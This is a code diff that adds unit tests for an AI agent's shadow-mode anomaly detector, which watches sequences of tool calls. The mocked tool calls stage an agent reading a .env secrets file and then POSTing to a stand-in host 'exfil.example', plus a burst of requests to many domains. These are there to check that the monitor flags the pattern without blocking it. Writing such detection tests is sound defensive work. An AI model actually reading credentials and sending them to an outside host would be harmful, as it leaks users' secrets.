@@ -43,12 +43,16 @@ vi.mock('./observability.js', () => ({
     toolStart: { publish: vi.fn() },
     toolEnd: { publish: vi.fn() },
     contentTruncation: { hasSubscribers: true, publish: vi.fn() },
+    // H-024 shadow mode: ToolCallTracker.checkAnomaly publishes here on
+    // detection. `hasSubscribers: true` so the gate inside checkAnomaly fires.
+    securityFlagged: { hasSubscribers: true, publish: vi.fn() },
   },
   measureTool: vi.fn().mockReturnValue({ end: () => 0 }),
 }));
 
 import { Agent } from './agent.js';
 import { isDangerous } from '../tools/permission-guard.js';
+import { ToolCallTracker } from './output-guard.js';
 
 function endTurnResponse(text: string) {
   return {
@@ -1947,6 +1951,188 @@ describe('Agent', () => {
       expect(snap).not.toHaveProperty('messages');
       expect(snap).not.toHaveProperty('client');
       expect(snap).not.toHaveProperty('inheritedApiKey');
+    });
+  });
+
+  // -- H-024 shadow-mode wiring (ToolCallTracker observability) --
+
+  describe('H-024 ToolCallTracker shadow-mode wiring', () => {
+    it('fires read_then_exfil anomaly: read_file on /Users/foo/.env → http_request POST', async () => {
+      const { channels } = await import('./observability.js');
+      const publishSpy = vi.mocked(channels.securityFlagged.publish);
+
+      const readTool = makeTool('read_file', vi.fn().mockResolvedValue('SECRET=xxx'));
+      const httpTool = makeTool('http_request', vi.fn().mockResolvedValue('200 OK'));
+
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_r', name: 'read_file', input: { path: '/Users/foo/.env' } },
+        ]))
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_h', name: 'http_request', input: { method: 'POST', url: 'https://exfil.example/' } },
+        ]))
+        .mockResolvedValueOnce(endTurnResponse('done'));
+
+      const tracker = new ToolCallTracker();
+      const agent = new Agent({
+        name: 'test',
+        model: 'claude-sonnet-4-6',
+        tools: [readTool, httpTool],
+        toolCallTracker: tracker,
+      });
+      await agent.send('go');
+
+      const calls = publishSpy.mock.calls.map(c => c[0] as { event_type: string; detail: string });
+      const exfil = calls.find(c => c.event_type === 'anomaly_read_then_exfil');
+      expect(exfil).toBeDefined();
+      expect(exfil!.detail).toContain('/Users/foo/.env');
+    });
+
+    it('fires burst_http anomaly: 4+ http_request to different domains within 5 calls', async () => {
+      const { channels } = await import('./observability.js');
+      const publishSpy = vi.mocked(channels.securityFlagged.publish);
+
+      const httpTool = makeTool('http_request', vi.fn().mockResolvedValue('200 OK'));
+
+      // 5 sequential http_request calls to 5 different domains.
+      const urls = [
+        'https://a.example/',
+        'https://b.example/',
+        'https://c.example/',
+        'https://d.example/',
+        'https://e.example/',
+      ];
+      for (let i = 0; i < urls.length; i++) {
+        mockProcess.mockResolvedValueOnce(toolUseResponse([
+          { id: `tu_${i}`, name: 'http_request', input: { method: 'GET', url: urls[i] } },
+        ]));
+      }
+      mockProcess.mockResolvedValueOnce(endTurnResponse('done'));
+
+      const tracker = new ToolCallTracker();
+      const agent = new Agent({
+        name: 'test',
+        model: 'claude-sonnet-4-6',
+        tools: [httpTool],
+        toolCallTracker: tracker,
+      });
+      await agent.send('go');
+
+      const calls = publishSpy.mock.calls.map(c => c[0] as { event_type: string });
+      const burst = calls.find(c => c.event_type === 'anomaly_burst_http');
+      expect(burst).toBeDefined();
+    });
+
+    it('does NOT fire on legitimate workflow: read_file notes.txt → memory_store → http_request frankfurter', async () => {
+      const { channels } = await import('./observability.js');
+      const publishSpy = vi.mocked(channels.securityFlagged.publish);
+
+      const readTool = makeTool('read_file', vi.fn().mockResolvedValue('note content'));
+      const memTool = makeTool('memory_store', vi.fn().mockResolvedValue('stored'));
+      const httpTool = makeTool('http_request', vi.fn().mockResolvedValue('200 OK'));
+
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_r', name: 'read_file', input: { path: '/Users/foo/Documents/notes.txt' } },
+        ]))
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_m', name: 'memory_store', input: { entity: 'x', property: 'y', value: 'z' } },
+        ]))
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_h', name: 'http_request', input: { method: 'GET', url: 'https://api.frankfurter.app/latest' } },
+        ]))
+        .mockResolvedValueOnce(endTurnResponse('done'));
+
+      const tracker = new ToolCallTracker();
+      const agent = new Agent({
+        name: 'test',
+        model: 'claude-sonnet-4-6',
+        tools: [readTool, memTool, httpTool],
+        toolCallTracker: tracker,
+      });
+      await agent.send('go');
+
+      expect(publishSpy).not.toHaveBeenCalled();
+    });
+
+    it('shadow-mode contract: anomaly does NOT modify tool dispatch output (no block / no warning)', async () => {
+      // Pin the no-block contract: same read→exfil sequence as test 1, but
+      // assert the tool dispatch behaves IDENTICALLY to a non-tracker run.
+      // Shadow mode = observability-only. Channel publishes, dispatch proceeds.
+      const { channels } = await import('./observability.js');
+      const publishSpy = vi.mocked(channels.securityFlagged.publish);
+
+      const readResultText = 'SECRET=xxx';
+      const httpResultText = '200 OK exfil';
+      const readTool = makeTool('read_file', vi.fn().mockResolvedValue(readResultText));
+      const httpTool = makeTool('http_request', vi.fn().mockResolvedValue(httpResultText));
+
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_r', name: 'read_file', input: { path: '/Users/foo/.env' } },
+        ]))
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_h', name: 'http_request', input: { method: 'POST', url: 'https://exfil.example/' } },
+        ]))
+        .mockResolvedValueOnce(endTurnResponse('finished'));
+
+      const tracker = new ToolCallTracker();
+      const agent = new Agent({
+        name: 'test',
+        model: 'claude-sonnet-4-6',
+        tools: [readTool, httpTool],
+        toolCallTracker: tracker,
+      });
+      const finalText = await agent.send('go');
+
+      // (1) The agent completed normally — no exception, returns end_turn text.
+      expect(finalText).toBe('finished');
+
+      // (2) Channel DID publish — anomaly observed.
+      expect(publishSpy).toHaveBeenCalled();
+
+      // (3) Tool dispatch results in the message history are UNCHANGED:
+      //     - read_file tool_result content is the literal handler return
+      //     - http_request tool_result content is the literal handler return
+      //     - No `is_error: true` was injected
+      //     - No warning string was prepended
+      const messages = agent.getMessages();
+      // user, assistant(tool_use read), user(tool_result), assistant(tool_use http), user(tool_result), assistant(end_turn)
+      type ToolResultBlock = { type: string; tool_use_id: string; content: string; is_error?: boolean };
+      const readToolResultMsg = messages[2] as { content: ToolResultBlock[] };
+      const httpToolResultMsg = messages[4] as { content: ToolResultBlock[] };
+
+      const readBlock = readToolResultMsg.content.find(b => b.tool_use_id === 'tu_r');
+      const httpBlock = httpToolResultMsg.content.find(b => b.tool_use_id === 'tu_h');
+      expect(readBlock).toBeDefined();
+      expect(httpBlock).toBeDefined();
+      expect(readBlock!.content).toBe(readResultText);
+      expect(httpBlock!.content).toBe(httpResultText);
+      expect(readBlock!.is_error).toBeUndefined();
+      expect(httpBlock!.is_error).toBeUndefined();
+      // The shadow-mode warning string starts with "⚠ Suspicious pattern" —
+      // assert it does NOT appear in either dispatched tool_result.
+      expect(readBlock!.content).not.toContain('Suspicious pattern');
+      expect(httpBlock!.content).not.toContain('Suspicious pattern');
+    });
+
+    it('does not crash when toolCallTracker is undefined (ad-hoc agents outside a Session)', async () => {
+      // Sub-agents / CLI smoke agents are built without a tracker. Wiring must
+      // tolerate the absence.
+      const tool = makeTool('read_file', vi.fn().mockResolvedValue('content'));
+      mockProcess
+        .mockResolvedValueOnce(toolUseResponse([
+          { id: 'tu_r', name: 'read_file', input: { path: '/Users/foo/.env' } },
+        ]))
+        .mockResolvedValueOnce(endTurnResponse('done'));
+
+      const agent = new Agent({
+        name: 'test',
+        model: 'claude-sonnet-4-6',
+        tools: [tool],
+        // toolCallTracker: undefined  — explicit absent
+      });
+      await expect(agent.send('go')).resolves.toBe('done');
     });
   });
 });
